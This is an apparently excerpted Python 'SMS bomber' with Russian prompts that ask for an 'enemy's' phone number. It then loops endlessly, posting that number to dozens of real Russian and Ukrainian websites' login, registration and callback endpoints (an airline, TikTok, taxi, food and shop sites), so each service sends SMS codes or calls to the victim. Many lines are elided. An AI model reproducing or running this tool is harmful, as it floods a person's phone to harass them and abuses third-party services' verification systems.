...
print(
    dedent(
        """\
            \033[35m
            Сделано @pkgsearch    Укажите номер врага
...
phone = input("\033[35m$Номер мрази +")
os.system("clear")
print(
    dedent(
        """\
...
print("Номер врага: ")
print(phone)
print("Чтобы взорвать жопу enter")
input()
os.system("clear")
print(
    dedent(
...
while True:
    ...
    try:
        requests.post(
            "https://b.utair.ru/api/v1/profile/",
            json={
                "phone": phone,
                "confirmationGDPRDate": int(
    ...
    try:
        ...
        phonemas = mask(str=phone, maska="#(###)###-##-##")
        requests.post(
            "https://www.r-ulybka.ru/login/form_ajax.php",
            data={"action": "auth", "phone": phonemas},
        )
    ...
    try:
        phonemas = mask(str=phone, maska="+# (###) ###-##-##")
        requests.post(
            "https://www.top-shop.ru/login/loginByPhone/", data={"phone": phonemas}
        )
    except:
        pass
    try:
        ...
        requests.post(
            "https://topbladebar.ru/user_account/ajax222.php?do=sms_code",
            data={"phone": phonemas},
        )
    except:
        pass
    ...
    try:
        requests.post(
            "https://m.tiktok.com/node-a/send/download_link",
            json={
                "slideVerify": 0,
                "language": "ru",
                "PhoneRegionCode": "7",
    ...
    try:
        ...
        requests.post(
            "https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",
    ...
    try:
        phonemas = mask(str=phone9, maska="8 (###) ###-##-##")
        requests.post(
            "http://sushigourmet.ru/auth", data={"phone": phonemas, "stage": 1}
        )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post(
            ...
            json={"RegisterSendForm": {"phone": phonemas}},
        )
    except:
        pass
    try:
        ...
        requests.post(
            ...
            data={"AUTH_ACTION": "SEND_USER_CODE", "phone": phonemas},
        )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post(
            ...
            data={"name": "Auth.SendPassword", "params[0]": phonemas},
        )
    except:
        pass
    try:
    ...
    try:
        requests.post(
            ...
            json={
                {
                    "query": 'mutation { phone(number:"'
                    + phone
                    + '", locale:ru) { token error { code message } } }'
                }
            },
        )
    except:
    ...
    try:
        ...
        requests.get(
            ...
            params={"cb_fio": name, "cb_phone": phonemas},
        )
    except:
        pass
    try:
    ...
    try:
        phonemas = mask(str=phone, maska="+## (###) ###-##-##")
        requests.post(
            "https://iqlab.com.ua/session/ajaxregister", data={"cellphone": phonemas}
        )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post(
            ...
            data={"customerName": name, "phone": phonemas, "g-recaptcha-response": ""},
        )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post(
            ...
            json={"phone": phonemas, "g-recaptcha-response": None},
        )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post(
            ...
            json={"phone": phonemas, "type": "register"},
        )
    except:
        pass
    try:
    ...
    try:
        ...
        requests.post(
            ...
            data={"phone": phonemas, "sendphone": "Далее"},
        )
    except:
        pass
    try:
    ...
    try:
        phonemas = mask(str=phone, maska="+# (###) ###-##-##")
        requests.post(
            "https://bartokyo.ru/ajax/login.php", data={"user_phone": phonemas}
        )
    except:
        pass
    try:
    ...
    try:
        phonemas = mask(str=phone9, maska="(###) ###-##-##")
        requests.get(
            "https://avtobzvon.ru/request/makeTestCall", params={"to": phonemas}
        )
    except:
        pass
    try:
